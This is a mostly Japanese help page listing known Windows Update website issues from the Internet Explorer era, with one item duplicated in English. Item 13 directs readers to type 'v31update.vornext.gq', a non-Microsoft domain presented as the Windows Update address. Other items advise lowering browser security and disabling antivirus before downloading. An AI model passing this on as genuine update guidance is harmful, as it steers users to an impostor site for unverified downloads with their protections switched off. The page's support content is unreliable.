確認されている Windows Update の問題
 以下は、すでに確認されている Windows Update Web サイトの問題です。ここに記述されていない問題を見つけた場合は、弊社までお知らせください。ご報告いただく際には、黒いツール バーの [フィードバック] をクリックし、[Windows Update] をクリックしてください。
  1. Windows Update の製品の更新カタログは、表示するたびに初期化されます。これは、コンピュータの最新の状態を確認するためです。たとえば、2 種類のテーマをダウンロードしてから製品の更新カタログに戻ると、ページは更新され、ダウンロードした 2 種類のテーマは利用できる更新の一覧には表示されません。これらは、[すべて表示] ボタンをクリックすると、"インストール済み" コンポーネントとして表示されます。

  2. ダウンロード中は左のナビゲーション バーは使用できません。これは、ダウンロードを確実に成功させるためです。ダウンロードが完了すると、ナビゲーション バーが使用できるようになります。

  3. Windows Update ホーム ページ中のリンクは、選択しても色が変わりません。

  4. このサイトの機能の一部は、ユーザー補助機能を利用したキーボード入力はサポートしていません。

  5. このサイトのウィンドウを複数表示し、更新できるソフトウェアを確認するために製品の更新を同時に実行した場合、長時間に渡ってブラウザが操作を受け付けなくなることがまれにあります。

  6. 製品カタログからコンポーネントのダウンロード後にダウンロード確認のページが表示されている間は、新しいウィンドウを開かないでください。新しいウィンドウを開くと、スクリプト エラーのメッセージが表示される場合があります。

  7. モデム経由でインターネットに接続している場合、まれにスクリプト エラーが発生することがあります。このような場合は、再度インターネットに接続し直してください。

  8. セキュリティ レベルを [高] に設定していると、製品の更新カタログにアクセスできません。製品の更新を使用するには、[中]、[中低]、または [低] に設定してください。セキュリティ設定を変更するには、次の手順に従ってください。
    1. [ツール] メニューの [インターネット オプション] をクリックします。
    2. [セキュリティ] タブをクリックし、上部のボックスで [インターネット] をクリックします。
    3. [中] をクリックします。

  9. 管理者権限があるユーザーでなければ、 Windows NT コンピュータに対してソフトウェアをインストールしたり、インストールされているソフトウェアを更新できません。 したがって、管理者権限がない場合は、必要なコントロールをダウンロードできないため、当サイトの一部のページが表示できないことがあります。

  10. The Windows Update site may appear in a language other than the language of your browser or operating system. For example, your browser and operating system might be in English, but the Windows Update site is in French. The Windows Update site appears in the language for which your browser's language preference is configured. To change the language preference of your browser:
    1. In Internet Explorer, click the Tools menu.
    2. Click Internet Options.
    3. On the General tab, click the Languages button.
    4. Select the language you want, then use the Move Up button to place your selection at the top of the list of languages.

  11. Windows Update サイトが、お使いのブラウザまたはオペレーティング システムで使用しているのとは異なる言語で表示されることがあります。たとえば、ブラウザやオペレーティング システムでは英語を利用しているのに、Windows Update サイトはフランス語で表示される場合などがあります。Windows Update のサイトは、ブラウザの言語設定で設定された言語で表示されます。ブラウザの言語設定を変更するには、次の手順に従ってください。
    1. Internet Explorer の [ツール] メニューをクリックします。
    2. [インターネット オプション] をクリックします。
    3. [全般] タブで、[言語] ボタンをクリックします。
    4. 使用する言語を選択し、[上へ] ボタンをクリックして、選択した言語を一覧の一番上に移動します。

  12. ウイルス対策ソフトウェア製品をお使いの場合 : 一部のウイルス対策ソフトウェアを使用している場合に、コンポーネントによってはダウンロードおよびインストールできないことがあります。この問題を回避するには、ウイルス対策ソフトウェアを無効にしてから、製品の更新カタログからダウンロードしてください。

  13. Internet Explorer の [お気に入り] に登録されている Windows Update へのリンクが正しく機能しない可能性があります。Windows Update に正しくアクセスするには、 Internet Explorer の [ツール] メニューで [Windows Update] をクリックしてください。 または、Internet Explorer のアドレスバーに、"v31update.vornext.gq" と入力します。

  14. Internet Explorer を最近アップグレードした場合、以前の Internet Explorer の使用中にインストールした更新が Windows Update に表示される場合があります。ここに表示される更新は、アップグレードしたブラウザ用の更新です。新しい Internet Explorer のセキュリティを高めるため、これらの更新をインストールすることをお勧めします。

  15. Windows Update Web サイトでは、[Read More] リンクは使用できなくなりました。Windows Update から使用できるセキュリティ問題の修正プログラムの詳細を参照するには、次の手順に従ってください。
    1. Microsoft セキュリティ Web サイト にアクセスします。
    2. [TechNet セキュリティ センター] をクリックします。
    3. [サイトの検索] テキスト ボックスに、Microsoft Knowledge Base (以下 KB) の番号を入力します。
    4. [検索] をクリックします。

  16. Windows Update Web サイトからインストールした更新を削除するには、次の手順に従ってください。
    1. [スタート] メニューの [設定] をポイントし、[コントロール パネル] をクリックします (Windows XP では、[スタート] メニューをクリックし、[コントロール パネル] をクリックします)。
    2. [アプリケーションの追加と削除] (Windows XP では [プログラムの追加と削除]) をダブルクリックします。
    3. 削除する項目をクリックし、[追加/削除] をクリックします (Windows 2000 では [変更/削除]、Windows XP では [変更と削除] をクリックします)。
    注 [アプリケーションの追加と削除] (Windows XP では [プログラムの追加と削除]) に項目が表示されない場合は、お使いのコンピュータから項目を削除することはできません。
